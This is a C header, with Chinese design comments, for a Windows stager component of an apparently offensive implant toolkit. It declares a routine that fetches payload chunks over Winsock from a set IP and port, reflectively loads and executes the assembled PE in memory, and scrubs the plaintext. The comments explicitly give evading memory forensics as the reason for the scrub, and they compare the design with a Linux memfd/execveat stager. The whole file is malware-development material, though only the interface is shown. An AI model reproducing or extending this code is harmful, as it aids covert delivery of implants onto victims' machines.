/*
 * agent_windows/include/drop_stager_win.h
 *
 * Windows 侧 stager：投送链的落地执行端。
 *
 * 为什么必须单独一份，而不是让 Linux stager 兼跑两边：
 *   Linux   dp_asm_exec 走 memfd + execveat —— 进程映像被替换，不返回。
 *   Windows 没有这两个机制，只能 VirtualAlloc + 反射装载，执行完
 *           **返回到 stager**。返回值语义、失败后的清理责任、明文残留
 *           的处理全都不同。合并成一个按 magic 分派的函数，会让"成功"
 *           在两边含义不同 —— 一方是映像替换，一方是装载完成且可执行
 *           代码已跑过。这种差异一旦被抹平，"已落地生效"就失去判据。
 *
 * 分工（本层不重复实现任何一层）：
 *   25_deploy/drop.c        分块接收、组装、摘要校验、HTTP 报文构造
 *   25_deploy/drop_pe.c     解包、PE 校验、region 需求、装载执行、明文擦除
 *   17_loader               头解析、映射、重定位、IAT
 *   本层                    Winsock 拉取、VirtualAlloc、回调接线、结果报告
 *
 * 硬规则：
 *   1. 未 seal 绝不装载。缺块却装载表现为"制品随机跑飞"，是最难定位的
 *      一类故障，因此校验落在装载之前，而不是交给装载器。
 *   2. 解包缓冲在装载后必须擦除。反射装载会返回，明文会一直留在堆上，
 *      既是内存取证目标，也让进程内存在两份植入体映像。
 *   3. region 不足即拒绝，不截断装载。
 *   4. 三个 rr_hooks 任一缺失即拒绝，绝不降级给 RWX 执行。
 */
#ifndef DAYANJING_AGENT_WINDOWS_DROP_STAGER_WIN_H
#define DAYANJING_AGENT_WINDOWS_DROP_STAGER_WIN_H

#include "reflect_run.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* 沿用 drop.h / drop_pe.h 的错误码；本层新增从 -50 起 */
#define WS_OK            0
#define WS_ERR_ARG      -50
#define WS_ERR_WSA      -51   /* Winsock 初始化失败 */
#define WS_ERR_FETCH    -52   /* 任一取块失败（连接/写/读） */
#define WS_ERR_HTTP     -53   /* 响应解析失败 */
#define WS_ERR_PUT      -54   /* 组装器拒绝该块 */
#define WS_ERR_SEAL     -55   /* 未收齐或摘要不符 */
#define WS_ERR_UNPACK   -56   /* 解包失败（含非 PE） */
#define WS_ERR_ALLOC    -57   /* VirtualAlloc 失败 */

typedef struct {
    const uint8_t *manifest;      /* dp_manifest_t 的字节映像 */
    const uint8_t *seed;
    size_t         seed_len;
    const char    *ip;            /* 点分十进制；不走 getaddrinfo（避免 NSS） */
    uint16_t       port;
    const rr_hooks_t *rh;         /* protect / call / resolve，三者必需 */
} wstage_cfg_t;

typedef struct {
    uint32_t chunks_fetched;      /* 成功取回并完成 HTTP 解析的块数 */
    uint32_t dup_count;
    uint32_t bad_count;
    uint32_t sealed_len;          /* 制品字节数 */
    size_t   plain_len;           /* 解包后明文长度 */
    size_t   region_size;         /* 实际分配 */
    size_t   region_need;         /* PE 声明所需 */
    int      machine;
    int      is_dll;
    int      entry_invoked;
    int      scrubbed;            /* 明文已擦除 */
    int      rc;                  /* 末次失败码 */
} wstage_result_t;

/*
 * 完整流程：Winsock 逐块拉取 -> 组装 -> seal -> 解包 -> VirtualAlloc
 *          -> 反射装载并执行 -> 明文擦除 -> 释放。
 *
 * 成功返回 WS_OK 且 out->entry_invoked == 1。
 * out 可为 NULL（只看返回值）。失败时已分配资源一律释放，不留泄漏。
 */
int wstage_run(const wstage_cfg_t *cfg, wstage_result_t *out);

const char *wstage_errstr(int rc);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_DROP_STAGER_WIN_H */
